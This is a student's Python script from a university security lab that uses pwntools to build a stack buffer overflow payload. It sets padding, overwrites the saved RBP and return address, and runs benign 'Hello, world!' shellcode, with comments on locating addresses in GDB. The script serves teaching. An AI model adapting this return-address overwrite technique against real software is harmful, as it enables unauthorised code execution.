#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016
#
# 	Gede Ria Ghosalya
# 	1001841

from pwn import *

# After doing a pattern search with payload of length 150,
# by using `patter offset` command with the content of RBP as argument
# it is found that the lenfill needed is 64
lenfill = 64 

# Hello World! payload - designed by Oka, 2014
payload = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'

# Set up return address. pwnlib is used to turn int to string
storedRBP = p64(0x4444444444444444) # DDDDDDDD in hex

# When running inside GDB
#
# We can change the “EEEEEEEE” into our shellcode address. 
# Running the code under GDB once, we know that the stored 
# RBP is in 0x7fffffffd740. Thus, the overwritten RIP should 
# be in the next address (+0x8) which is 0x7fffffffd748, and 
# the shellcode (+0x10) is in 0x7fffffffd50.
#
storedRIPgdb = p64(0x00007fffffffd750)


# When directly running on shell
#
# We were able to run the “Hello World!” shellcode after 
# the program in GDB. However, this does not work in normal shell. 
# Inspecting core by looking at `info frame` and some `x/wx` commmand, 
# we can see that the RBP is in 0x7fffffffd790, thus our RIP should be 
# 0x7fffffffd7a0.
storedRIP    = p64(0x00007fffffffd7a0) 

# With this, we were able to run the shellcode in normal shell.

with open('payloadgdb','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIPgdb + payload + b'\n')

with open('payload','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIP + payload + b'\n')
